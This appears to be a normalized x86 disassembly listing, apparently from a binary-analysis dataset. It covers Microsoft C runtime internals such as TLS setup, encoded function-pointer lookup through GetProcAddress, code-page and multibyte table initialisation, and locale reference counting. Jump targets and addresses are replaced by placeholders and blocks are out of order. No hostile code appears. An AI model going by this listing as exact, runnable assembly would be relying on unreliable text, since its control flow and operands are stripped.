or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_414dd8
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_414dfa
push ebp
mov ebp esp
sub esp 0x44
lea eax [ ebp - 0x44 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x18 ] 0x1
je r-xdata
push 0xa
pop eax
leave
retn
movzx eax [ ebp - 0x14 ]
leave
retn
sub_414e1b
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
setg al
pop esi
leave
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_414e5a
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_4150d2
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_411550
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_411550
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_411714
mov eax esi
sub_415127
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
cmp [ edi + 0x78 ] 0x0
je r-xdata
mov eax [ edi + 0x80 ]
test eax eax
je r-xdata
push [ edi + 0x78 ]
call esi
cmp [ edi + 0x7c ] 0x0
je r-xdata
push eax
call esi
mov eax [ edi + 0x88 ]
test eax eax
je r-xdata
push [ edi + 0x7c ]
call esi
push 0x6
pop eax
lea ebx [ edi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call esi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call esi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0x9c ]
add eax 0xb0
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push [ ebx - 0x4 ]
call esi
mov eax [ ebp + 0x8 ]
sub_4151b7
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0x84 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
lea edi [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_40e8f2
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_40e8f2
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_40e8f2
push [ esi + 0x88 ]
call sub_40e8f2
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_41aba1
push [ esi + 0x9c ]
call sub_40e8f2
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_40e8f2
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_40e8f2
push [ ebx ]
call sub_40e8f2
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_40e8f2
push [ esi + 0x84 ]
call sub_40e8f2
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40e8f2
push [ esi + 0x84 ]
call sub_41aa3e
pop ecx
pop ecx
push eax
call sub_40e8f2
pop ecx
push eax
call sub_40e8f2
push [ esi + 0x84 ]
call sub_41ab3a
pop ecx
pop ecx
sub_415311
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
cmp [ esi + 0x78 ] 0x0
je r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
push [ esi + 0x78 ]
call edi
cmp [ esi + 0x7c ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push [ esi + 0x7c ]
call edi
push 0x6
pop eax
lea ebx [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call edi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call edi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov ecx [ esi + 0x9c ]
add ecx 0xb0
push ecx
call edi
pop edi
pop ebx
push [ ebx - 0x4 ]
call edi
mov eax [ ebp + 0x8 ]
sub_4153ac
push 0xc
push r--data
call sub_4110a0
call sub_415d5f
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_415428
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41541f
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_415d5f
mov esi [ eax + 0x6c ]
mov eax esi
call sub_4110e5
retn
push 0x20
call sub_40fcb1
sub_415428
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_415127
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_415311
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_4151b7
pop ecx
sub_415491
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4154cb
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_40f858
mov eax [ ebp + 0x8 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_415537
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_414160
xor eax eax
movzx ecx ax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x21c ] edi
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
add esp 0xc
sub edi ebx
mov ecx 0x101
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4155a0
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
pop eax
sub eax edx
mov ecx ebx
mov [ ebp - 0x520 ] eax
mov eax ebx
cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
lea ecx [ ebp - 0x512 ]
jmp r-xdata
mov [ edx ] bl
or [ esi + ecx + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov eax [ ebp - 0x520 ]
inc ecx
lea edx [ esi + 0x119 ]
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_41b00d
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_41625d
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_41625d
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_41572e
push 0xc
push r--data
call sub_4110a0
call sub_415d5f
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4157ca
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_4110e5
retn
push 0x20
call sub_40fcb1
cmp esi rw-data
je r-xdata
push esi
call sub_40e8f2
pop ecx
sub_4157d3
push 0x10
push r--data
call sub_4110a0
or edi 0xffffffff
call sub_415d5f
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_41572e
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_4154cb
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_41100b
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_4110e5
retn
mov ecx 0x88
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_415981
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
push [ eax + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
mov eax [ ebp - 0x1c ]
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ ebp - 0x1c ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_411550
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40e8f2
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_40e8f2
pop ecx
mov eax [ ebp - 0x1c ]
push 0xd
call sub_4162e1
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov al [ esi + ebx + 0x119 ]
mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41594b
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_40e8f2
pop ecx
sub_415981
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_4154cb
mov ebx eax
pop ecx
mov [ ebp - 0x20 ] ebx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x1c ] ecx
mov eax edi
push esi
call sub_415537
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_414160
mov edx [ ebp - 0x1c ]
add esp 0xc
imul edx edx 0x30
lea eax [ edx + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
mov ebx [ ebp - 0x20 ]
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_415491
add esp 0x4
mov [ esi + 0x21c ] eax
push 0x6
lea ecx [ esi + 0xc ]
lea edx [ edx + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx ebx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
mov [ ecx ] ax
lea edx [ edx + 0x2 ]
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_4155a0
cmp ebx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp ebx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + ebx + 0x19 ] al
movzx eax [ ecx + 0x1 ]
inc ebx
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_414160
mov [ esi + 0x4 ] ebx
xor ebx ebx
inc ebx
add esp 0xc
mov [ esi + 0x21c ] edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_415537
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_415491
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx ecx [ eax ]
movzx edx dl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_415b76
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_40f858
mov esi [ ebp - 0x14 ]
mov eax [ esi + 0xa8 ]
test eax eax
jne r-xdata
mov edx 0x100
push 0x1
cmp [ ebp + 0x8 ] dx
jae r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp ax 0x19
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_416896
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_4191a5
pop ecx
pop ecx
test eax eax
jne r-xdata
movzx eax cx
movzx eax ax
jmp r-xdata
add cx 0x20
movzx eax [ ebp - 0x4 ]
movzx eax [ ebp + 0x8 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ esi + 0x94 ]
movzx eax [ eax + ecx ]
movzx eax [ ebp + 0x8 ]
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
pop esi
je r-xdata
movzx eax ax
jmp r-xdata
movzx eax ax
jmp r-xdata
sub_415c28
push 0x8
push r--data
call sub_4110a0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4110e5
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_40e8f2
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_40e8f2
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_40e8f2
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_40e8f2
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_40e8f2
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_40e8f2
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_40e8f2
pop ecx
push 0xd
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push [ esi + 0x5c ]
call sub_40e8f2
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415d4a
push 0xc
call sub_4162e1
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415d56
push esi
call sub_40e8f2
pop ecx
push edi
call sub_415311
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_40e8f2
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_4151b7
pop ecx
sub_415d77
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_414db9
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_410fc1
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_414dd8
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_40e8f2
pop ecx
xor esi esi
push 0x0
push esi
call sub_415de6
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_415de6
push 0x8
push r--data
call sub_4110a0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415e87
push 0xc
call sub_4162e1
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_415127
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415e90
call sub_4110e5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_415e99
call sub_40fd90
call sub_416410
test eax eax
jne r-xdata
push sub_415c28
call sub_414d7c
pop ecx
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call sub_415f0f
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_410fc1
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_415f0f
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_414dd8
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_415de6
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_415f2c
push 0x8
push r--data
call sub_4110a0
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_4110e5
retn
push 0xc
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_415428
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415f75
sub_415f7e
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push [ ebp + 0x10 ]
call sub_40f858
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_41602d
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_41b00d
add esp 0x1c
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41602d
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40f858
mov eax [ ebp - 0x10 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_416074
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
